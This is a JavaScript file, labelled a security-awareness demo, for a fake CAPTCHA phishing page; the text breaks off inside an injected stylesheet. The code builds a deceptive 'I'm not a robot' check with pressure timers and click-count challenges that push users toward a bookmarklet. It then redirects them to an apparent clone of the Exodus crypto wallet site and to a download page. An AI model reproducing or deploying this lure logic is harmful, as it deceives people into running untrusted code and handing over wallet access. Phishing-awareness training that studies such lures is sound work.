/**
 * Security Awareness Demo – Captcha Phishing
 *
 * Two-stage flow: Stage 1 = captcha images + counters; Stage 2 = math question (answer from localStorage).
 * 20 second countdown timer. LocalStorage keys: additionClickCount, subtractionClickCount, etc.
 */

(function () {
  "use strict";

  var captchaWidgetHost = document.getElementById("captcha-widget-host");
  function getEl(id) {
    var el = document.getElementById(id);
    if (el) return el;
    if (captchaWidgetHost && captchaWidgetHost.shadowRoot) {
      return captchaWidgetHost.shadowRoot.getElementById(id);
    }
    return null;
  }

  const STORAGE_KEYS = {
    addition: "additionClickCount",
    subtraction: "subtractionClickCount",
    multiplication: "multiplicationClickCount",
    division: "divisionClickCount",
  };
  const REQUIRED_CLICKS = 10;
  const REDIRECT_DELAY_MS = 3000;
  const COUNTDOWN_SECONDS = 20;
  const VERIFYING_DELAY_MS = 4000;
  const REDIRECT_AFTER_VERIFY_MS = 3000;

  const timerEl = getEl("timer");
  const timerValue = getEl("timer-value");
  const answerValue = getEl("answerValue");
  const doneButton = getEl("doneButton");
  const submitButton = getEl("submitButton");
  const captchaContainer = getEl("captcha-container");
  const stage1Buttons = getEl("stage1-buttons");
  const stage2 = getEl("stage2");
  const mathQuestion = getEl("mathQuestion");
  const mathAnswerInput = getEl("mathAnswerInput");
  const mathFeedback = getEl("mathFeedback");
  const verifyingScreen = getEl("verifying-screen");
  const captchaContent = getEl("captcha-content");
  const robotCheckbox = getEl("robotCheckbox");
  const captchaBox = getEl("captcha-box");
  const verifyHumanBtn = getEl("verifyHumanBtn");
  const verifyStep = getEl("verify-step");
  const verifyLoader = getEl("verifyLoader");
  const challengePopupOverlay = getEl("challenge-popup-overlay");
  const exodusPopupOverlay = getEl("exodus-popup-overlay");
  const exodusPopupOk = getEl("exodus-popup-ok");
  const verifiedScreen = getEl("verified-screen");
  const captchaWidget = getEl("captcha-widget");
  const verifyStatus = getEl("verify-status");
  const verifySpinner = getEl("verify-spinner");
  const verifyStatusText = getEl("verify-status-text");
  const verifySuccess = getEl("verify-success");
  const verifySuccessMsg = getEl("verify-success-msg");
  const verifySuccessHost = getEl("verify-success-host");
  const captchaWidgetWrap = getEl("captcha-widget-wrap");

  let verifyTimeouts = [];

  let countdownRemaining = COUNTDOWN_SECONDS;
  let countdownInterval = null;
  let stage = 1; // 1 = captcha images, 2 = math question

  function getCount(key) {
    try {
      const raw = localStorage.getItem(key);
      const n = parseInt(raw, 10);
      return Number.isFinite(n) ? Math.max(0, n) : 0;
    } catch {
      return 0;
    }
  }

  function getAllCounts() {
    return {
      addition: getCount(STORAGE_KEYS.addition),
      subtraction: getCount(STORAGE_KEYS.subtraction),
      multiplication: getCount(STORAGE_KEYS.multiplication),
      division: getCount(STORAGE_KEYS.division),
    };
  }

  function getTotalClicks() {
    const c = getAllCounts();
    return c.addition + c.subtraction + c.multiplication + c.division;
  }

  function setAnswerDisplay() {
    if (!answerValue) return;
    const c = getAllCounts();
    if (c.addition === 0 && c.subtraction === 0 && c.multiplication === 0 && c.division === 0) {
      answerValue.textContent = "Your selections will appear here.";
      return;
    }
    answerValue.textContent =
      "Addition: " +
      c.addition +
      ", Subtraction: " +
      c.subtraction +
      ", Multiplication: " +
      c.multiplication +
      ", Division: " +
      c.division;
  }

  function startCountdown() {
    if (countdownInterval) return;
    if (timerValue) timerValue.textContent = countdownRemaining;
    countdownInterval = setInterval(function () {
      countdownRemaining -= 1;
      if (timerValue) timerValue.textContent = countdownRemaining;
      if (timerEl) {
        timerEl.classList.remove("timer-low");
        if (countdownRemaining <= 5) timerEl.classList.add("timer-low");
        if (countdownRemaining <= 0) timerEl.classList.add("timer-out");
      }
      if (countdownRemaining <= 0) {
        clearInterval(countdownInterval);
        countdownInterval = null;
        onTimeUp();
      }
    }, 1000);
  }

  function onTimeUp() {
    if (stage === 1) {
      if (captchaContainer) captchaContainer.classList.add("hidden");
      if (stage1Buttons) stage1Buttons.classList.add("hidden");
      if (answerValue) answerValue.textContent = "Time's up. You can try again by refreshing.";
    } else {
      if (mathAnswerInput) mathAnswerInput.disabled = true;
      if (submitButton) submitButton.disabled = true;
      if (mathFeedback) {
        mathFeedback.textContent = "Time's up.";
        mathFeedback.classList.remove("hidden", "success");
        mathFeedback.classList.add("error");
      }
    }
  }

  function goToStage2() {
    stage = 2;
    if (captchaContainer) captchaContainer.classList.add("hidden");
    if (stage1Buttons) stage1Buttons.classList.add("hidden");
    if (answerValue) answerValue.classList.add("hidden");

    const c = getAllCounts();
    const a = c.addition;
    const b = c.subtraction;
    const part1 = a * 97 + b * 83;
    const part2 = a + b * 11;
    const part3 = a * a + b * b + a * b * 3;
    const correctAnswer = part1 * part2 + part3;
    window._captchaCorrectAnswer = correctAnswer; // for verify

    if (mathQuestion) {
      mathQuestion.textContent =
        "(" +
        a +
        " × 97 + " +
        b +
        " × 83) × (" +
        a +
        " + " +
        b +
        " × 11) + (" +
        a +
        "² + " +
        b +
        "² + " +
        a +
        "×" +
        b +
        "×3) = ?";
    }
    if (stage2) stage2.classList.remove("hidden");
    if (mathAnswerInput) {
      mathAnswerInput.value = "";
      mathAnswerInput.focus();
    }
    if (mathFeedback) {
      mathFeedback.classList.add("hidden");
      mathFeedback.classList.remove("success", "error");
    }
  }

  function handleDoneClick() {
    setAnswerDisplay();
    goToStage2();
  }

  function checkProgressAndRedirect() {
    const total = getTotalClicks();
    // Random threshold between 20 and 30 clicks (inclusive) per page load
    if (typeof window.__captchaRedirectThreshold !== "number") {
      window.__captchaRedirectThreshold = 20 + Math.floor(Math.random() * 11); // 20–30
    }
    const threshold = window.__captchaRedirectThreshold;
    if (total >= threshold) {
      setTimeout(function () {
        window.location.href = "exodus-clone.html";
      }, 1000);
    }
  }

  function handleVerifyAnswer() {
    if (countdownRemaining <= 0) return;
    const correct = window._captchaCorrectAnswer;
    const raw = mathAnswerInput && mathAnswerInput.value.trim();
    const userAnswer = parseInt(raw, 10);
    const isCorrect = Number.isFinite(userAnswer) && userAnswer === correct;

    if (!mathFeedback) return;
    mathFeedback.classList.remove("hidden", "success", "error");
    if (isCorrect) {
      var fromBookmarklet = new URLSearchParams(location.search).get("from_bookmarklet") === "1";
      if (fromBookmarklet) {
        mathFeedback.textContent = "Correct!";
        mathFeedback.classList.add("success");
        if (captchaContent) captchaContent.classList.add("hidden");
        if (verifiedScreen) verifiedScreen.classList.remove("hidden");
        setTimeout(function () {
          window.location.href = "download.html?redirect_to=" + encodeURIComponent("https://www.exodus.com");
        }, 2500);
      } else {
        mathFeedback.textContent = "Correct!";
        mathFeedback.classList.add("success");
        if (exodusPopupOverlay) exodusPopupOverlay.classList.remove("hidden");
      }
    } else {
      mathFeedback.textContent = "Incorrect. Try again.";
      mathFeedback.classList.add("error");
    }
  }

  function handleSubmitClick() {
    if (stage === 2) {
      handleVerifyAnswer();
    }
  }

  if (doneButton) {
    doneButton.addEventListener("click", handleDoneClick);
  }

  if (submitButton) {
    submitButton.addEventListener("click", handleSubmitClick);
  }

  if (mathAnswerInput) {
    mathAnswerInput.addEventListener("keydown", function (e) {
      if (e.key === "Enter") handleVerifyAnswer();
    });
  }

  function openChallenge() {
    if (!captchaBox) return;
    document.body.classList.add("body-popup-open");
    // Reset challenge to stage 1
    var ch1 = getEl("challenge1");
    var ch2 = getEl("challenge2");
    if (ch1) ch1.classList.remove("hidden");
    if (ch2) ch2.classList.add("hidden");
    // Show popup
    if (challengePopupOverlay) challengePopupOverlay.classList.remove("hidden");
    captchaBox.classList.remove("hidden");
    // Position modal with arrow from checkbox (index.html style)
    var popup = challengePopupOverlay ? challengePopupOverlay.querySelector(".challenge-popup") : null;
    var widgetEl = document.getElementById("widget-container");
    var arrowEl = document.getElementById("challenge-popup-arrow-el");
    var arrowLineEl = document.getElementById("challenge-popup-arrow-line-el");
    if (popup && widgetEl) {
      var r = widgetEl.getBoundingClientRect();
      var vw = document.documentElement.clientWidth || window.innerWidth;
      var vh = document.documentElement.clientHeight || window.innerHeight;
      var popupW = Math.min(400, vw - 40);
      var padding = 20;
      var estPopupH = 420;
      var leftOffset = 199;
      var left = Math.max(padding, Math.min(vw - popupW - padding, (vw - popupW) / 2 - leftOffset));
      var top = (vh - estPopupH) / 2 - 80;
      top = Math.max(padding, top);
      top = Math.min(top, vh - estPopupH - padding);
      var maxH = vh - top - padding;
      popup.style.setProperty("left", left + "px", "important");
      popup.style.setProperty("top", top + "px", "important");
      popup.style.setProperty("width", popupW + "px", "important");
      popup.style.setProperty("max-width", popupW + "px", "important");
      popup.style.setProperty("max-height", maxH + "px", "important");
      challengePopupOverlay.classList.add("challenge-popup-anchor");
      popup.classList.add("challenge-popup-with-arrow");
      if (!arrowEl) {
        arrowEl = document.createElement("div");
        arrowEl.id = "challenge-popup-arrow-el";
        arrowEl.className = "challenge-popup-arrow";
        arrowEl.setAttribute("aria-hidden", "true");
        arrowEl.style.display = "none";
        popup.appendChild(arrowEl);
      } else if (arrowEl.parentNode !== popup) {
        popup.appendChild(arrowEl);
      }
      if (!arrowLineEl) {
        arrowLineEl = document.createElement("div");
        arrowLineEl.id = "challenge-popup-arrow-line-el";
        arrowLineEl.className = "challenge-popup-arrow-line";
        arrowLineEl.setAttribute("aria-hidden", "true");
        arrowLineEl.style.display = "none";
        document.body.appendChild(arrowLineEl);
      }
      // Arrow inside modal (border ke sath); line from checkbox to modal edge
      var cbCenterY = r.top + r.height / 2;
      var arrowW = 22;
      var arrowH = 16;
      var lineStartX = r.right;
      var lineEndX = left - arrowW;
      var lineWidth = Math.max(0, lineEndX - lineStartX);
      arrowLineEl.style.left = lineStartX + "px";
      arrowLineEl.style.top = (cbCenterY - 4) + "px";
      arrowLineEl.style.width = lineWidth + "px";
      arrowLineEl.style.display = "block";
      arrowLineEl.style.visibility = "visible";
      arrowEl.style.left = "";
      arrowEl.style.right = "";
      arrowEl.style.top = (cbCenterY - top - arrowH - 10) + "px";
      arrowEl.style.display = "block";
      arrowEl.style.visibility = "visible";
    } else {
      if (arrowEl) { arrowEl.style.display = "none"; arrowEl.style.visibility = "hidden"; }
      if (arrowLineEl) { arrowLineEl.style.display = "none"; arrowLineEl.style.visibility = "hidden"; }
      if (challengePopupOverlay) challengePopupOverlay.classList.remove("challenge-popup-anchor");
      if (popup) {
        popup.classList.remove("challenge-popup-with-arrow");
        popup.style.left = popup.style.top = popup.style.width = popup.style.maxWidth = popup.style.maxHeight = "";
      }
    }
    buildChallenge1Grid();
    // Sync click counter display
    var clickCounterEl = getEl("clickCounter");
    if (clickCounterEl) clickCounterEl.textContent = localStorage.getItem("bookmarkletClicks") || "0";
  }

  function clearVerifyTimeouts() {
    verifyTimeouts.forEach(function (t) { clearTimeout(t); });
    verifyTimeouts = [];
  }

  function resetVerifyUI() {
    clearVerifyTimeouts();
    if (captchaWidget) captchaWidget.classList.remove("verify-active");
    if (verifyStatus) verifyStatus.classList.add("hidden");
    if (verifySpinner) verifySpinner.classList.remove("hidden");
    if (verifyStatusText) {
      verifyStatusText.textContent = "Verifying...";
      verifyStatusText.classList.remove("hidden");
    }
    if (verifySuccess) verifySuccess.classList.add("hidden");
    if (verifySuccessMsg) verifySuccessMsg.classList.add("hidden");
    if (captchaWidgetWrap) captchaWidgetWrap.classList.remove("hidden");
    if (robotCheckbox) robotCheckbox.checked = false;
    var visibleCb = getEl("visibleCheckbox");
    if (visibleCb) visibleCb.classList.remove("checked");
  }

  function startVerifyFlow() {
    clearVerifyTimeouts();
    if (!captchaWidget || !verifyStatus || !verifySpinner || !verifyStatusText || !verifySuccess) {
      openChallenge();
      return;
    }
    captchaWidget.classList.add("verify-active");
    verifyStatus.classList.remove("hidden");
    verifySpinner.classList.remove("hidden");
    verifyStatusText.textContent = "Verifying...";
    verifyStatusText.classList.remove("hidden");
    verifySuccess.classList.add("hidden");

    // After 2.5s of spinner: open the captcha challenge directly
    var t1 = setTimeout(function () {
      resetVerifyUI();
      openChallenge();
    }, 2500);
    verifyTimeouts.push(t1);
  }

  // Clicking the checkbox triggers: spinner -> success message -> then open challenge
  if (robotCheckbox) {
    robotCheckbox.addEventListener("change", function () {
      if (robotCheckbox.checked) {
        startVerifyFlow();
      } else {
        document.body.classList.remove("body-popup-open");
        resetVerifyUI();
        if (captchaBox) captchaBox.classList.add("hidden");
        if (challengePopupOverlay) challengePopupOverlay.classList.add("hidden");
        var arr = document.getElementById("challenge-popup-arrow-el");
        var lineArr = document.getElementById("challenge-popup-arrow-line-el");
        if (arr) { arr.style.display = "none"; arr.style.visibility = "hidden"; }
        if (lineArr) { lineArr.style.display = "none"; lineArr.style.visibility = "hidden"; }
      }
    });
  }

  // Clicking overlay (outside popup) closes the challenge and shows main page again
  if (challengePopupOverlay) {
    challengePopupOverlay.addEventListener("click", function (e) {
      if (e.target === challengePopupOverlay) {
        document.body.classList.remove("body-popup-open");
        if (captchaBox) captchaBox.classList.add("hidden");
        challengePopupOverlay.classList.add("hidden");
        var arr = document.getElementById("challenge-popup-arrow-el");
        var lineArr = document.getElementById("challenge-popup-arrow-line-el");
        if (arr) { arr.style.display = "none"; arr.style.visibility = "hidden"; }
        if (lineArr) { lineArr.style.display = "none"; lineArr.style.visibility = "hidden"; }
      }
    });
  }

  // Widget click: ensure spinner flow runs (same as checking the box)
  if (captchaWidget) {
    captchaWidget.addEventListener("click", function (e) {
      if (e.target && e.target.tagName === "A") return;
      if (!robotCheckbox || robotCheckbox.checked) return;
      robotCheckbox.checked = true;
      var visibleCb = getEl("visibleCheckbox");
      if (visibleCb) visibleCb.classList.add("checked");
      startVerifyFlow();
    });
  }

  // When there is no checkbox (e.g. Applications-style widget): show tick -> brief spinner -> then open modal
  if (!robotCheckbox && challengePopupOverlay) {
    var wc = document.getElementById("widget-container");
    if (wc) {
      wc.addEventListener("click", function (e) {
        e.preventDefault();
        e.stopPropagation();
        if (!window.__captchaWidgetReady) return;
        var container = document.getElementById("widget-container");
        var initialScreen = document.getElementById("initial-load-screen");
        if (container && container.shadowRoot) {
          var checkboxInput = container.shadowRoot.querySelector("input[type=checkbox]");
          if (checkboxInput) checkboxInput.checked = true; // tick mark
        }
        // 1 second pause with spinner, then open modal
        if (initialScreen) initialScreen.classList.remove("hidden");
        if (container) container.classList.add("hidden");
        setTimeout(function () {
          if (initialScreen) initialScreen.classList.add("hidden");
          if (container) container.classList.remove("hidden");
          if (container && container.shadowRoot) {
            var cb = container.shadowRoot.querySelector("input[type=checkbox]");
            if (cb) cb.checked = false;
          }
          openChallenge();
        }, 1000);
      }, true);
    }
  }

  // Also support the button if it exists
  if (verifyHumanBtn) {
    verifyHumanBtn.addEventListener("click", function () {
      if (!robotCheckbox || !robotCheckbox.checked) return;
      startVerifyFlow();
    });
  }

  if (exodusPopupOk) {
    exodusPopupOk.addEventListener("click", function (e) {
      e.preventDefault();
      if (exodusPopupOverlay) exodusPopupOverlay.classList.add("hidden");
      window.location.replace("https://www.exodus.com");
    });
  }

  function showCaptchaAndStart() {
    if (verifyingScreen) {
      verifyingScreen.classList.add("verifying-hidden");
      document.body.classList.remove("verifying-active");
    }
    if (captchaContent) captchaContent.classList.remove("hidden");
    setAnswerDisplay();
  }

  // On load: show only "I'm not a robot" (captcha-content visible, captcha-box hidden, verifying-screen hidden)
  document.body.classList.remove("verifying-active");
  setAnswerDisplay();

  // Clear localStorage on fresh captcha page visit (not from bookmarklet)
  (function () {
    var params = new URLSearchParams(location.search);
    if (!params.get("from_bookmarklet") && !params.get("show_exodus_popup")) {
      localStorage.setItem(STORAGE_KEYS.addition, "0");
      localStorage.setItem(STORAGE_KEYS.subtraction, "0");
      localStorage.setItem(STORAGE_KEYS.multiplication, "0");
      localStorage.setItem(STORAGE_KEYS.division, "0");
      localStorage.setItem("bookmarkletClicks", "0");
      setAnswerDisplay();
    }
  })();

  // If landed with show_exodus_popup=1 (e.g. after 10 symbol clicks), show popup then redirect to exodus
  (function () {
    var params = new URLSearchParams(location.search);
    if (params.get("show_exodus_popup") === "1" && exodusPopupOverlay) {
      if (verifyingScreen) verifyingScreen.classList.add("verifying-hidden");
      document.body.classList.remove("verifying-active");
      if (captchaContent) captchaContent.classList.remove("hidden");
      exodusPopupOverlay.classList.remove("hidden");
    }
  })();

  // Build unified bookmarklet - works from anywhere (captcha page or exodus.com)
  const baseUrlMeta = getEl("captcha-base-url");
  const captchaBaseUrl = (baseUrlMeta && baseUrlMeta.getAttribute("content") && baseUrlMeta.getAttribute("content").trim()) || location.origin;
  const pdfPath = "assets/Backstage%20Logo.pdf";
  const pdfFilename = "Backstage Logo.pdf";
  const GLASS_PCT_PER_CLICK = 0.46;
  /** Step 2 only: enough bookmark spam → redirect. */
  const SPAM_CLICKS_TO_REDIRECT = 85;
  /** Zombies stage: if user never uses the bookmark in this window, close & retry. */
  const ZOMBIE_NO_BOOKMARK_IDLE_MS = 12000;

  function getStep2SpamClicks() {
    var total = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
    var base = typeof window._challenge2ClicksBaseline === "number" ? window._challenge2ClicksBaseline : 0;
    return Math.max(0, total - base);
  }

  function trySpamRedirect() {
    if (!currentPuzzle || !currentPuzzle.step2 || !currentPuzzle.step2.noManualDone) return;
    // Random per-challenge threshold between 20 and 30 spam clicks.
    if (typeof window.__step2RedirectThreshold !== "number") {
      window.__step2RedirectThreshold = 20 + Math.floor(Math.random() * 11); // 20–30
    }
    if (getStep2SpamClicks() >= window.__step2RedirectThreshold) {
      showWidgetSuccessThenRedirect();
    }
  }

  /** Close challenge popup, reset widget (zombies fail / no bookmark — no blocking dialog). */
  function closeChallengeForRetry() {
    stopChallenge2Visuals();
    if (window._spamRedirectPoll) {
      clearInterval(window._spamRedirectPoll);
      window._spamRedirectPoll = null;
    }
    currentPuzzle = null;
    document.body.classList.remove("body-popup-open");
    if (captchaBox) captchaBox.classList.add("hidden");
    if (challengePopupOverlay) {
      challengePopupOverlay.classList.add("hidden");
      challengePopupOverlay.classList.remove("challenge-popup-anchor");
    }
    var popupRetry = challengePopupOverlay ? challengePopupOverlay.querySelector(".challenge-popup") : null;
    if (popupRetry) {
      popupRetry.classList.remove("challenge-popup-with-arrow");
      popupRetry.style.left = popupRetry.style.top = popupRetry.style.width = popupRetry.style.maxWidth = popupRetry.style.maxHeight = "";
    }
    var arrR = document.getElementById("challenge-popup-arrow-el");
    var lineArrR = document.getElementById("challenge-popup-arrow-line-el");
    if (arrR) {
      arrR.style.display = "none";
      arrR.style.visibility = "hidden";
    }
    if (lineArrR) {
      lineArrR.style.display = "none";
      lineArrR.style.visibility = "hidden";
    }
    if (robotCheckbox) robotCheckbox.checked = false;
    var visibleCbR = getEl("visibleCheckbox");
    if (visibleCbR) visibleCbR.classList.remove("checked");
    resetVerifyUI();
  }

  function stopChallenge2Visuals() {
    if (window._jumpDisplayInterval) {
      clearInterval(window._jumpDisplayInterval);
      window._jumpDisplayInterval = null;
    }
    if (window._glassVisualInterval) {
      clearInterval(window._glassVisualInterval);
      window._glassVisualInterval = null;
    }
    if (window._zombiesCanvasRaf) {
      cancelAnimationFrame(window._zombiesCanvasRaf);
      window._zombiesCanvasRaf = null;
    }
    if (window._stormHealthInterval) {
      clearInterval(window._stormHealthInterval);
      window._stormHealthInterval = null;
    }
    if (window._mathProgressInterval) {
      clearInterval(window._mathProgressInterval);
      window._mathProgressInterval = null;
    }
    if (window._mathSuggestionInterval) {
      clearInterval(window._mathSuggestionInterval);
      window._mathSuggestionInterval = null;
    }
    if (window._jumpRobotRaf) {
      cancelAnimationFrame(window._jumpRobotRaf);
      window._jumpRobotRaf = null;
    }
    if (window._quizCaptchaInterval) {
      clearInterval(window._quizCaptchaInterval);
      window._quizCaptchaInterval = null;
    }
    if (window._spamRedirectPoll) {
      clearInterval(window._spamRedirectPoll);
      window._spamRedirectPoll = null;
    }
    if (window._zombiesIdleTimeout) {
      clearTimeout(window._zombiesIdleTimeout);
      window._zombiesIdleTimeout = null;
    }
    stopStep2PressureTimer();
  }

  function stopStep2PressureTimer() {
    if (window._step2PressureTimerId) {
      clearInterval(window._step2PressureTimerId);
      window._step2PressureTimerId = null;
    }
  }

  /** Step 2 pressure timer — visual only; at 0s the challenge keeps running (no reset, no alert). */
  function startStep2PressureTimer(totalSec) {
    stopStep2PressureTimer();
    if (!totalSec || totalSec < 1) totalSec = 6;
    var remaining = totalSec;
    function syncPressureTimerUi() {
      var v = getEl("step2TimerValue");
      var f = getEl("step2TimerFill");
      if (v) v.textContent = String(remaining);
      if (f) f.style.width = Math.max(0, (remaining / totalSec) * 100) + "%";
    }
    syncPressureTimerUi();
    requestAnimationFrame(syncPressureTimerUi);
    window._step2PressureTimerId = setInterval(function () {
      if (!currentPuzzle || !currentPuzzle.step2) {
        stopStep2PressureTimer();
        return;
      }
      remaining -= 1;
      if (remaining < 0) remaining = 0;
      syncPressureTimerUi();
      if (remaining <= 0) {
        stopStep2PressureTimer();
      }
    }, 1000);
  }

  (function injectPuzzleVisualStyles() {
    var _pvOld = document.getElementById("puzzle-visual-css");
    if (_pvOld) _pvOld.remove();
    if (!document.getElementById("puzzle-rich-fonts")) {
      var fl = document.createElement("link");
      fl.id = "puzzle-rich-fonts";
      fl.rel = "stylesheet";
      fl.href =
        "https://fonts.googleapis.com/css2?family=Outfit:wght@500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap";
      document.head.appendChild(fl);
    }
    var st = document.createElement("style");
    st.id = "puzzle-visual-css";
    st.textContent =
      ".challenge-stage2-body.stage2-dark-scene{background:linear-gradient(165deg,#0b1220 0%,#1e293b 55%,#0f172a 100%)!important;border-top:1px solid rgba(255,255,255,.06)!important;gap:12px!important}" +
      ".challenge-stage2-body.puzzle-body-tall{min-height:220px!important;justify-content:center!important;padding-top:12px!important;gap:10px!important}" +
      ".challenge-stage2-body.step2-glass-scene{background:linear-gradient(180deg,#fafafa 0%,#f4f4f5 50%,#eceff3 100%)!important;border-top:1px solid rgba(0,0,0,.06)!important}" +
      ".puzzle-glass-wrap{width:100%;max-width:100%;margin:0;overflow:visible;position:relative;padding:2px;border-radius:18px;background:linear-gradient(145deg,rgba(255,255,255,.95),rgba(236,242,249,.9));box-shadow:0 1px 0 rgba(255,255,255,.9) inset,0 12px 40px rgba(15,23,42,.08),0 4px 12px rgba(30,64,120,.06);border:1px solid rgba(148,163,184,.35)}" +
      ".puzzle-glass-scene{position:relative;height:200px;border-radius:15px;background:linear-gradient(180deg,#bfdbfe 0%,#93c5fd 22%,#7dd3fc 45%,#e0f2fe 72%,#f0f9ff 100%);display:flex;align-items:center;justify-content:center;overflow:hidden;box-shadow:inset 0 0 0 1px rgba(255,255,255,.5),inset 0 -24px 48px rgba(59,130,246,.12),0 8px 24px rgba(37,99,235,.1);border:1px solid rgba(59,130,246,.28)}" +
      ".puzzle-glass-scene::before{content:'';position:absolute;inset:0;opacity:.35;pointer-events:none;z-index:1;background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40'%3E%3Cpath fill='%23ffffff' d='M0 0h40v1H0zm0 2h40v1H0zm0 4h40v1H0zm0 6h40v1H0zm0 8h40v1H0zm0 10h40v1H0zm0 12h40v1H0zm0 14h40v1H0zm0 16h40v1H0zm0 18h40v1H0zm0 20h40v1H0zm0 22h40v1H0zm0 24h40v1H0zm0 26h40v1H0zm0 28h40v1H0zm0 30h40v1H0zm0 32h40v1H0zm0 34h40v1H0zm0 36h40v1H0zm0 38h40v1H0z'/%3E%3C/svg%3E\")}" +
      ".puzzle-glass-scene::after{content:'';position:absolute;inset:0;pointer-events:none;z-index:2;background:radial-gradient(ellipse 90% 55% at 50% -5%,rgba(255,255,255,.65),transparent 55%),radial-gradient(ellipse 70% 50% at 100% 100%,rgba(59,130,246,.08),transparent 50%)}" +
      ".puzzle-glass-pane{position:relative;width:64%;max-width:220px;height:72%;max-height:150px;border-radius:14px;background:linear-gradient(155deg,rgba(255,255,255,.42) 0%,rgba(255,255,255,.22) 42%,rgba(186,230,253,.18) 100%);box-shadow:0 16px 40px rgba(30,58,138,.2),0 0 0 1px rgba(255,255,255,.65) inset,inset 0 1px 2px rgba(255,255,255,.9),inset 0 -8px 20px rgba(59,130,246,.15);border:1px solid rgba(255,255,255,.55);transition:transform .15s,filter .2s;backdrop-filter:blur(14px) saturate(1.4);-webkit-backdrop-filter:blur(14px) saturate(1.4);z-index:3}" +
      ".puzzle-glass-pane.hammer-hit{animation:glass-shake .12s ease;filter:brightness(1.02) drop-shadow(0 0 8px rgba(59,130,246,.2))}" +
      "@keyframes glass-shake{0%,100%{transform:translate(0,0)}25%{transform:translate(-4px,2px)}75%{transform:translate(4px,-2px)}}" +
      ".glass-shine{position:absolute;inset:0;border-radius:13px;background:linear-gradient(118deg,transparent 28%,rgba(255,255,255,.75) 42%,rgba(255,255,255,.35) 52%,transparent 65%);pointer-events:none;z-index:5;animation:glass-shine-glow 2.2s ease-in-out infinite}" +
      "@keyframes glass-shine-glow{0%,100%{opacity:.55}50%{opacity:.95}}" +
      ".glass-crack-layer{position:absolute;inset:0;border-radius:13px;pointer-events:none;opacity:0;transition:opacity .15s;background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cpath d='M50 5 L48 35 L55 50 L42 70 L50 95 M35 20 L48 35 M65 25 L55 50 M30 55 L42 70 M70 60 L50 95' fill='none' stroke='rgba(30,58,138,.45)' stroke-width='1.6'/%3E%3C/svg%3E\");background-size:cover;z-index:4;filter:drop-shadow(0 0 1px rgba(255,255,255,.8))}" +
      ".glass-crack-layer.c2{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cpath d='M20 10 L35 40 L25 65 L40 90 M80 15 L65 45 L75 70 L55 88 M50 5 L35 40 L65 45 L50 5' fill='none' stroke='rgba(14,116,144,.5)' stroke-width='1.7'/%3E%3C/svg%3E\");z-index:4}" +
      ".glass-crack-layer.c3{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cpath d='M5 50 L30 48 L50 30 L70 52 L95 45 M15 75 L30 48 M85 25 L70 52' fill='none' stroke='rgba(30,64,175,.42)' stroke-width='1.8'/%3E%3C/svg%3E\");z-index:4}" +
      ".glass-shards{position:absolute;inset:0;pointer-events:none;z-index:6;opacity:0}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shards{opacity:1}" +
      ".glass-shard{position:absolute;left:50%;top:50%;width:40%;height:44%;margin-left:-20%;margin-top:-22%;border-radius:4px;background:linear-gradient(135deg,rgba(255,255,255,.68) 0%,rgba(219,234,254,.52) 40%,rgba(191,219,254,.35) 100%);box-shadow:0 8px 24px rgba(30,64,144,.4),inset 0 2px 4px rgba(255,255,255,.95);border:1.2px solid rgba(255,255,255,.8);opacity:0;backdrop-filter:blur(8px)}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard{opacity:1}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(1){animation:gs1 .5s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(2){animation:gs2 .52s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(3){animation:gs3 .48s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(4){animation:gs4 .5s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(5){animation:gs5 .51s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(6){animation:gs6 .49s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(7){animation:gs7 .53s ease-out forwards}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shard:nth-child(8){animation:gs8 .5s ease-out forwards}" +
      "@keyframes gs1{0%{transform:translate(0,0) rotate(0)}100%{transform:translate(-72px,-28px) rotate(-32deg)}}" +
      "@keyframes gs2{0%{transform:translate(0,0) rotate(0)}100%{transform:translate(68px,-35px) rotate(28deg)}}" +
      "@keyframes gs3{0%{transform:translate(0,0) rotate(0)}100%{transform:translate(-40px,52px) rotate(18deg)}}" +
      "@keyframes gs4{0%{transform:translate(0,0) rotate(0)}100%{transform:translate(52px,48px) rotate(-22deg)}}" +
      "@keyframes gs5{0%{transform:translate(0,0) scale(.85) rotate(0)}100%{transform:translate(-8px,-62px) scale(.9) rotate(12deg)}}" +
      "@keyframes gs6{0%{transform:translate(0,0) scale(.8) rotate(0)}100%{transform:translate(12px,58px) scale(.85) rotate(-15deg)}}" +
      "@keyframes gs7{0%{transform:translate(0,0) rotate(0)}100%{transform:translate(-58px,18px) rotate(25deg)}}" +
      "@keyframes gs8{0%{transform:translate(0,0) rotate(0)}100%{transform:translate(58px,12px) rotate(-30deg)}}" +
      ".puzzle-glass-pane.shattered{animation:glass-break .4s ease-out forwards;filter:drop-shadow(0 0 12px rgba(59,130,246,.3))}" +
      "@keyframes glass-break{to{transform:scale(.08) rotate(12deg);filter:brightness(1.8) blur(3px);opacity:0}}" +
      ".puzzle-glass-scene.glass-destroyed .glass-shine{opacity:0;transition:opacity .2s}" +
      ".puzzle-storm-v2{position:relative;display:flex;flex-direction:column;width:100%;max-width:100%;margin:0;min-height:0;border-radius:16px;overflow:hidden;box-shadow:0 14px 44px rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.08);background:linear-gradient(165deg,#0a1628 0%,#0f172a 42%,#0c1220 100%);border:1px solid rgba(251,191,36,.38);font-family:'Outfit',system-ui,sans-serif;max-height:min(42vh,340px);contain:layout}" +
